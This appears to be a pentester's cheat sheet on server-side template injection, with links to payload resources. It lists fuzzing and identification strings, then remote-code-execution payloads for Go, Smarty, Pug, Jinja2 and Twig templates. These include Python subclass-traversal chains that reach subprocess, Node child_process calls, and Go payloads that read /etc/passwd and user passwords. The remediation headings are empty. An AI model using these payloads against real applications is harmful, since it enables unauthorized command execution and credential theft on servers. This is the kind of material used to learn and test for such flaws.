# Resource for more complicated payloads: https://github.com/swisskyrepo/PayloadsAllTheThings

# https://book.hacktricks.xyz/

## Payloads Fuzzing: ${{<%'"}}%

## PoC Payload for Identification: ${7*'7'}

## Explaining further about more template engines here: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Remediation:

### 1: Secure methods

### 2: Sanitization

## Example payloads of different templates:

## Go SSTI

#### 1) {{ .Password }} (Fetches the passwords of all users) Hint: It depends on the struct the application has been made of to use the correct one! 

#### 2) {{ .GetFile "/etc/passwd" }} (Gets the passwd linux file)

#### 3) {{ .ExecuteCmd "whoami" }} Executes commands

#### 4) {{ . }} (Dumps variables)

## PHP - Smarty

#### PoC Enumeration Payload

    {'Hello'|upper}
  
#### RCE Payload

    {system("id")}

## NodeJS - Pug

### PoC Payload

    #{7*7}

### RCE Payload

    #{root.process.mainModule.require('child_process').spawnSync('id').stdout}

### SpawnSync RCE Payload with arguments

    #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

## Python - Jinja2

### PoC Payload

    {{7*7}}

### RCE Payload

    {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("id")}}

### check_output RCE Payload with arguments

    {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}

## PHP - Twig

### PoC Payload

    {{7*7}}

### RCE Payload

    {{exec('id')}}

    {{['id',""]|sort('passthru')}}
